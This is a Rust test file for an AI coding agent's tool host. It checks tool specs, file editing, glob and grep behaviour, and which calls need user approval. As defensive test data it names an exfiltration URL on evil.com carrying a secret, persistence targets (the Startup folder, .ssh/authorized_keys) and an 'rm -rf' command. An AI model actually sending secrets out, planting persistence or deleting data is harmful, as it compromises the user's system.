//! Every declared tool is exercised through the `ToolHost` interface, with its consequence.

mod common;

use std::sync::Arc;

use common::*;
use marlowe_agent::{Consequence, Exposure, ToolHost};
use marlowe_exec::{BuiltinTools, SearchResponse, SearchResult};
use serde_json::json;

const NAMES: [&str; 20] = [
    "read", "write", "edit", "multi_edit", "notebook_edit", "glob", "grep", "bash", "powershell", "python", "web_fetch",
    "arxiv", "symbols", "definition", "references", "hover", "diagnostics", "rename_symbol", "task_output", "task_stop",
];

const VERIFY: [&str; 4] = ["project", "service", "http_check", "browser"];

#[test]
fn the_declared_tools_are_exactly_the_implemented_ones() {
    let ws = Ws::new("et-specs");
    let t = ws.tools();
    // The verify group (project, service, http_check, browser) has its own tests.
    let specs: Vec<_> = t.specs().into_iter().filter(|s| !VERIFY.contains(&s.name.as_str())).collect();
    let names: Vec<_> = specs.iter().map(|s| s.name.as_str()).collect();
    assert_eq!(names, NAMES, "web_search appears only with a backend");
    for s in &specs {
        assert!(!s.description.is_empty());
        assert_eq!(s.input_schema["type"], "object");
        // Every required parameter is declared.
        for r in s.input_schema["required"].as_array().into_iter().flatten() {
            assert!(s.input_schema["properties"].get(r.as_str().unwrap()).is_some(), "{}", s.name);
        }
        // No tool answers "unknown tool".
        let o = call(&t, &s.name, json!({}));
        assert!(!o.content.contains("unknown tool"), "{} has no executor", s.name);
    }
    let t = ws.tools().with_search(Arc::new(|_: &str, _: &_| Ok(SearchResponse::default())));
    assert!(t.specs().iter().any(|s| s.name == "web_search"));
    assert!(call(&t, "nonsense", json!({})).is_error);
}

#[test]
fn non_object_arguments_are_an_error_not_a_panic() {
    let ws = Ws::new("et-args");
    let t = ws.tools();
    for bad in [json!(null), json!("str"), json!([1, 2]), json!(5)] {
        for n in NAMES {
            assert!(call(&t, n, bad.clone()).is_error, "{n} with {bad}");
        }
    }
}

#[test]
fn write_then_read_then_edit_roundtrip() {
    let ws = Ws::new("et-rw");
    let t = ws.tools();
    let o = call(&t, "write", json!({"path": "deep/dir/a.txt", "content": "one\ntwo\n"}));
    assert!(!o.is_error, "{}", o.content);
    assert_eq!(o.summary, "+2 −0");
    assert_eq!(ws.get("deep/dir/a.txt"), "one\ntwo\n");
    let o = call(&t, "write", json!({"path": "deep/dir/a.txt", "content": "x\n"}));
    assert_eq!(o.summary, "+1 −2");
    let o = call(&t, "edit", json!({"path": "deep/dir/a.txt", "replacing": "x", "content": "y"}));
    assert!(!o.is_error);
    assert_eq!(ws.get("deep/dir/a.txt"), "y\n");
    assert!(call(&t, "write", json!({"path": "a.txt"})).is_error);
}

#[test]
fn edit_failures_say_what_went_wrong() {
    let ws = Ws::new("et-editfail");
    let t = ws.tools();
    ws.put("f.txt", "fn main() {\n    println!(\"hi\");\n}\n");
    let e = |replacing: &str| call(&t, "edit", json!({"path": "f.txt", "replacing": replacing, "content": "z"}));
    let o = e("absent text");
    assert!(o.is_error && o.content.contains("not found in the file"), "{}", o.content);
    let o = e("println!(\"hi\");");
    assert!(!o.is_error);
    ws.put("f.txt", "fn main() {\n    println!(\"hi\");\n}\n");
    let o = e("println!(\"hi\");");
    assert!(!o.is_error);
    ws.put("f.txt", "a\n    b\n");
    let o = e("a\nb");
    assert!(o.is_error && o.content.contains("apart from whitespace"), "{}", o.content);
    assert!(e("").content.contains("empty"));
    assert!(call(&t, "edit", json!({"path": "f.txt", "content": "z"})).content.contains("`replacing` is required"));
    let o = call(&t, "edit", json!({"path": "nope.txt", "replacing": "a", "content": "b"}));
    assert!(o.is_error && o.content.contains("does not exist"));
    ws.put("empty.txt", "");
    let o = call(&t, "edit", json!({"path": "empty.txt", "replacing": "a", "content": "b"}));
    assert!(o.is_error && o.content.contains("empty"));
}

#[test]
fn concurrent_edits_to_one_file_all_land() {
    let ws = Ws::new("et-concurrent");
    ws.put("f.txt", (0..16).map(|i| format!("slot{i}=0\n")).collect::<String>());
    let t = Arc::new(ws.tools());
    std::thread::scope(|s| {
        for i in 0..16 {
            let t = Arc::clone(&t);
            s.spawn(move || {
                let o = call(&t, "edit", json!({"path": "f.txt", "replacing": format!("slot{i}=0"), "content": format!("slot{i}=1")}));
                assert!(!o.is_error, "{}", o.content);
            });
        }
    });
    assert_eq!(ws.get("f.txt"), (0..16).map(|i| format!("slot{i}=1\n")).collect::<String>());
}

#[test]
fn glob_lists_filters_and_skips_build_output() {
    let ws = Ws::new("et-glob");
    ws.put("a.rs", "");
    ws.put("src/b.rs", "");
    ws.put("src/deep/c.rs", "");
    ws.put("src/d.txt", "");
    ws.put("target/junk.rs", "");
    let t = ws.tools();
    let o = call(&t, "glob", json!({"pattern": "*.rs"}));
    // Newest first; the three files were written within a moment of each other.
    let mut listed = o.content.lines().take(3).collect::<Vec<_>>();
    listed.sort_unstable();
    assert_eq!(listed, ["a.rs", "src/b.rs", "src/deep/c.rs"]);
    assert!(o.content.contains("not searched") && o.content.contains("target"));
    assert!(!o.content.contains("junk.rs"));
    let o = call(&t, "glob", json!({"pattern": "src/*.rs"}));
    assert!(o.content.starts_with("src/b.rs") && !o.content.contains("c.rs"), "{}", o.content);
    // Newest first: touching an older file puts it at the top.
    let old = std::time::SystemTime::now() - std::time::Duration::from_secs(3_600);
    for f in ["a.rs", "src/b.rs", "src/deep/c.rs"] {
        std::fs::OpenOptions::new().write(true).open(ws.path(f)).unwrap().set_modified(old).unwrap();
    }
    std::fs::OpenOptions::new().write(true).open(ws.path("src/deep/c.rs")).unwrap().set_modified(std::time::SystemTime::now()).unwrap();
    let o = call(&t, "glob", json!({"pattern": "*.rs"}));
    assert_eq!(o.content.lines().next(), Some("src/deep/c.rs"), "{}", o.content);
    let o = call(&t, "glob", json!({"path": "target"}));
    assert!(o.content.contains("junk.rs"), "naming a skipped directory searches it");
    let o = call(&t, "glob", json!({"pattern": "*.xyz"}));
    assert!(o.content.contains("no files matched"), "{}", o.content);
    let o = call(&t, "glob", json!({"path": "a.rs"}));
    assert!(o.is_error);
    assert!(call(&t, "glob", json!({"pattern": "*.MD"})).content.contains("no files matched"));
    // Globs are case-sensitive, as in ripgrep.
    ws.put("Readme.MD", "");
    assert!(call(&t, "glob", json!({"pattern": "*.md"})).content.contains("no files matched"));
    assert!(call(&t, "glob", json!({"pattern": "*.MD"})).content.starts_with("Readme.MD"));
}

/// Found live: `**/Cargo.toml` returned 0 paths in a 25-manifest workspace because `**` was two
/// one-segment stars (so it matched exactly one directory level and never the root manifest).
#[test]
fn globstar_finds_every_manifest_at_every_depth() {
    let ws = Ws::new("et-globstar");
    ws.put("Cargo.toml", "");
    for i in 0..24 {
        ws.put(&format!("crates/c{i:02}/Cargo.toml"), "");
    }
    ws.put("crates/c00/fuzz/Cargo.toml", "");
    ws.put("target/debug/build/Cargo.toml", "");
    let t = ws.tools();
    let o = call(&t, "glob", json!({"pattern": "**/Cargo.toml"}));
    assert_eq!(o.summary, "26 paths", "{}", o.content);
    assert!(o.content.lines().any(|l| l == "Cargo.toml"), "{}", o.content);
    assert!(o.content.contains("crates/c00/fuzz/Cargo.toml"));
    assert!(!o.content.contains("target/debug"), "build output stays skipped");
    // Patterns are relative to `path` when one is given; backslashes and `./` are accepted.
    let o = call(&t, "glob", json!({"path": "crates", "pattern": "*/Cargo.toml"}));
    assert_eq!(o.summary, "24 paths", "{}", o.content);
    let o = call(&t, "glob", json!({"pattern": r".\crates\**\Cargo.toml"}));
    assert_eq!(o.summary, "25 paths", "{}", o.content);
    ws.put("crates/c01/Cargo.toml", "x = 1\n");
    let o = call(&t, "grep", json!({"pattern": "x", "glob": "**/c01/*.toml", "output_mode": "content"}));
    assert!(o.content.starts_with("crates/c01/Cargo.toml:1:"), "{}", o.content);
}

#[test]
fn grep_reports_matches_context_and_how_many_files_it_read() {
    let ws = Ws::new("et-grep");
    ws.put("a.txt", "alpha\nbeta\ngamma\ndelta\n");
    ws.put("b.txt", "nothing\n");
    // (Not 0xff 0xfe first: that is a UTF-16 byte-order mark, which ripgrep decodes as text.)
    ws.put("c.bin", [0x89u8, b'P', b'N', b'G', 0x00, 0x01]);
    let t = ws.tools();
    let content = |args: serde_json::Value| {
        let mut args = args;
        args["output_mode"] = json!("content");
        call(&t, "grep", args)
    };
    // The default answer is the list of files.
    assert!(call(&t, "grep", json!({"pattern": "gam+a"})).content.starts_with("a.txt\n[1 file(s) contain a NUL byte"));
    let o = content(json!({"pattern": "gam+a"}));
    assert!(o.content.starts_with("a.txt:3:gamma"), "{}", o.content);
    assert_eq!(o.summary, "1 matches · 1 files");
    assert!(o.content.contains("NUL byte"), "{}", o.content);
    let o = content(json!({"pattern": "gamma", "context": 1}));
    assert_eq!(o.content.lines().take(3).collect::<Vec<_>>(), ["a.txt-2-beta", "a.txt:3:gamma", "a.txt-4-delta"]);
    let o = content(json!({"pattern": "gamma", "context": "1"}));
    assert!(!o.is_error);
    assert!(content(json!({"pattern": "GAMMA"})).content.contains("no line matched"));
    assert!(content(json!({"pattern": "(?i)GAMMA"})).content.starts_with("a.txt:3"));
    assert!(content(json!({"pattern": "GAMMA", "-i": true})).content.starts_with("a.txt:3"));
    assert!(content(json!({"pattern": "alpha", "glob": "b.*"})).content.contains("no line matched"));
}

#[test]
fn grep_refuses_what_it_does_not_declare() {
    let ws = Ws::new("et-grep-refuse");
    let t = ws.tools();
    for (args, needle) in [
        (json!({"pattern": "x", "-z": true}), "is not a parameter"),
        (json!({}), "required"),
        (json!({"pattern": ""}), "empty"),
        (json!({"pattern": "foo("}), "not a valid regular expression"),
        (json!({"pattern": "x", "context": 201}), "0 to 200"),
        (json!({"pattern": "x", "context": "many"}), "whole number"),
        (json!({"pattern": "x", "glob": ""}), "empty"),
    ] {
        let o = call(&t, "grep", args.clone());
        assert!(o.is_error && o.content.contains(needle), "{args}: {}", o.content);
    }
    ws.put("f.txt", "x");
    // A single file is searched as itself.
    let o = call(&t, "grep", json!({"pattern": "x", "path": "f.txt"}));
    assert!(!o.is_error && o.content == "f.txt", "{}", o.content);
    let o = call(&t, "grep", json!({"pattern": "a{300}{300}"}));
    assert!(o.is_error && o.content.contains("not a valid regular expression"), "{}", o.content);
}

#[test]
fn grep_degrades_to_counts_past_the_line_budget() {
    let ws = Ws::new("et-grep-budget");
    ws.put("big.txt", "hit\n".repeat(500));
    let t = ws.tools();
    let o = call(&t, "grep", json!({"pattern": "hit", "output_mode": "content"}));
    assert_eq!(o.content.lines().filter(|l| l.starts_with("big.txt:")).count(), 250, "head_limit defaults to 250");
    assert!(o.content.contains("pass offset=250 for the next page"), "{}", &o.content[o.content.len() - 200..]);
    // The count mode has the whole number; `offset` pages on.
    let o = call(&t, "grep", json!({"pattern": "hit", "output_mode": "count"}));
    assert_eq!(o.content, "big.txt:500");
    let o = call(&t, "grep", json!({"pattern": "hit", "output_mode": "content", "offset": 250, "head_limit": 300}));
    assert!(o.content.starts_with("big.txt:251:hit") && o.content.lines().filter(|l| l.starts_with("big.txt:")).count() == 250, "{}", o.content);
}

#[test]
fn consequences_follow_the_workspace_boundary() {
    let ws = Ws::new("et-conseq");
    let outside = Ws::new("et-conseq-out");
    let t = ws.tools();
    let c = |name: &str, args| t.consequence(&req(name, args));
    for free in ["read", "glob", "grep", "web_fetch"] {
        assert_eq!(c(free, json!({"path": outside.path("x").to_string_lossy()})), Consequence::Free, "{free}");
    }
    assert_eq!(c("write", json!({"path": "inside.txt", "content": ""})), Consequence::Free);
    assert_eq!(c("edit", json!({"path": "sub/dir/new.txt"})), Consequence::Free);
    let abs_in = ws.path("a/b.txt");
    assert_eq!(c("write", json!({"path": abs_in.to_string_lossy()})), Consequence::Free);
    for path in [
        outside.path("x.txt").to_string_lossy().into_owned(),
        "../escape.txt".to_string(),
        "sub/../../escape.txt".to_string(),
    ] {
        match c("write", json!({"path": path})) {
            Consequence::Ask { summary } | Consequence::AskEvery { summary } => assert!(summary.contains("outside the workspace"), "{summary}"),
            Consequence::Free => panic!("{path} must ask"),
        }
    }
    for shell in ["bash", "powershell"] {
        match c(shell, json!({"command": "rm -rf x\nsecond line"})) {
            Consequence::Ask { summary } | Consequence::AskEvery { summary } => assert_eq!(summary, format!("{shell}: rm -rf x (+1 line)")),
            Consequence::Free => panic!("{shell} must ask"),
        }
    }
    assert!(matches!(c("python", json!({"code": "print(1)"})), Consequence::Ask { .. } | Consequence::AskEvery { .. }));
    assert!(matches!(c("python", json!({"path": "s.py"})), Consequence::Ask { .. } | Consequence::AskEvery { .. }));
    let rootless = BuiltinTools::new(None);
    assert!(matches!(rootless.consequence(&req("write", json!({"path": "a.txt"}))), Consequence::Ask { .. } | Consequence::AskEvery { .. }));
}

#[test]
fn a_home_directory_workspace_frees_no_writes() {
    let Some(home) = std::env::var_os("USERPROFILE").or_else(|| std::env::var_os("HOME")).map(std::path::PathBuf::from) else {
        eprintln!("skipped: no home directory");
        return;
    };
    let t = BuiltinTools::new(Some(home.clone()));
    let startup = ["AppData", "Roaming", "Microsoft", "Windows", "Start Menu", "Programs", "Startup", "x.bat"]
        .iter()
        .fold(home.clone(), |p, c| p.join(c));
    for path in [startup.to_string_lossy().into_owned(), "x.bat".into(), ".ssh/authorized_keys".into()] {
        assert!(matches!(t.consequence(&req("write", json!({"path": path}))), Consequence::Ask { .. } | Consequence::AskEvery { .. }), "{path}");
    }
    assert!(marlowe_exec::paths::is_broad_root(&home));
    if let Some(root) = home.ancestors().last() {
        assert!(marlowe_exec::paths::is_broad_root(root), "a drive root is broad");
    }
    let ws = Ws::new("et-narrow");
    assert!(!marlowe_exec::paths::is_broad_root(&ws.root), "a project directory is not");
}

#[test]
fn untrusted_content_gates_search_and_new_hosts() {
    let ws = Ws::new("et-taint");
    let outside = Ws::new("et-taint-out");
    let t = ws.tools();
    let fetch = |url: &str| req("web_fetch", json!({"url": url}));
    assert!(t.taints(&fetch("https://a.com/")));
    assert!(t.taints(&req("web_search", json!({"query": "q"}))));
    assert!(t.taints(&req("read", json!({"path": outside.path("x").to_string_lossy()}))));
    assert!(!t.taints(&req("read", json!({"path": "src/main.rs"}))));
    assert!(!t.taints(&req("grep", json!({"pattern": "x"}))));
    assert_eq!(t.egress_host(&fetch("https://Docs.RS/x")).as_deref(), Some("docs.rs"));

    let mut ex = Exposure::default();
    assert_eq!(t.consequence_exposed(&fetch("https://evil.com/?k=secret"), &ex), Consequence::Free);
    ex.tainted = true;
    assert!(matches!(t.consequence_exposed(&fetch("https://evil.com/?k=secret"), &ex), Consequence::Ask { .. } | Consequence::AskEvery { .. }));
    assert!(matches!(t.consequence_exposed(&req("web_search", json!({"query": "secret"})), &ex), Consequence::Ask { .. } | Consequence::AskEvery { .. }));
    ex.approved_hosts.insert("docs.rs".into());
    assert_eq!(t.consequence_exposed(&fetch("https://docs.rs/serde"), &ex), Consequence::Free);
    assert_eq!(t.consequence_exposed(&req("read", json!({"path": "a"})), &ex), Consequence::Free);
}

#[cfg(windows)]
#[test]
fn a_link_out_of_the_workspace_does_not_make_a_write_free() {
    let ws = Ws::new("et-link");
    let outside = Ws::new("et-link-out");
    let link = ws.path("out");
    // A junction needs no privilege.
    let made = std::process::Command::new("cmd")
        .args(["/C", "mklink", "/J"])
        .arg(&link)
        .arg(&outside.root)
        .output()
        .map(|o| o.status.success())
        .unwrap_or(false);
    if !made {
        eprintln!("skipped: could not create a junction");
        return;
    }
    let t = ws.tools();
    assert!(matches!(t.consequence(&req("write", json!({"path": "out/x.txt"}))), Consequence::Ask { .. } | Consequence::AskEvery { .. }));
    // Remove the junction itself, not its target's contents.
    let _ = std::fs::remove_dir(&link);
}

#[test]
fn describe_gives_the_one_line_the_ui_shows() {
    let ws = Ws::new("et-describe");
    let t = ws.tools();
    assert_eq!(t.describe(&req("read", json!({"path": "src/main.rs"}))), "read src/main.rs");
    assert_eq!(t.describe(&req("bash", json!({"command": "cargo test\nmore"}))), "bash cargo test");
    assert_eq!(t.describe(&req("glob", json!({}))), "glob");
}

#[test]
fn web_search_goes_through_the_injected_backend() {
    let ws = Ws::new("et-search");
    let backend = |q: &str, _: &marlowe_model::CancelToken| {
        if q == "boom" {
            return Err("backend down".to_string());
        }
        Ok(SearchResponse {
            answer: format!("Answer about {q}."),
            results: vec![SearchResult { title: "Doc".into(), url: "https://example.com/doc".into(), snippet: "a snippet".into() }],
        })
    };
    let t = ws.tools().with_search(Arc::new(backend));
    let o = call(&t, "web_search", json!({"query": "rust"}));
    assert!(!o.is_error);
    assert!(o.content.starts_with("Answer about rust."));
    assert!(o.content.contains("1. Doc — https://example.com/doc"));
    assert_eq!(o.summary, "1 sources");
    let o = call(&t, "web_search", json!({"query": "boom"}));
    assert!(o.is_error && o.content.contains("backend down"));
    assert!(call(&t, "web_search", json!({"query": "  "})).is_error);
    assert!(call(&ws.tools(), "web_search", json!({"query": "x"})).is_error, "no backend, no search");
}

#[test]
fn web_fetch_refuses_other_schemes_and_bad_urls() {
    // Plain http:// is upgraded to https:// (T20); that path is covered offline in web_tests.rs.
    let ws = Ws::new("et-fetch");
    let t = ws.tools();
    for url in ["ftp://x", "example.com", "https://user@host/", ""] {
        let o = call(&t, "web_fetch", json!({"url": url}));
        assert!(o.is_error, "{url}: {}", o.content);
    }
}

#[test]
#[ignore = "needs network"]
fn web_fetch_reads_a_live_page() {
    let ws = Ws::new("et-fetch-live");
    let o = call(&ws.tools(), "web_fetch", json!({"url": "https://example.com/"}));
    assert!(!o.is_error, "{}", o.content);
    assert!(o.content.contains("Example Domain"), "{}", o.content);
}
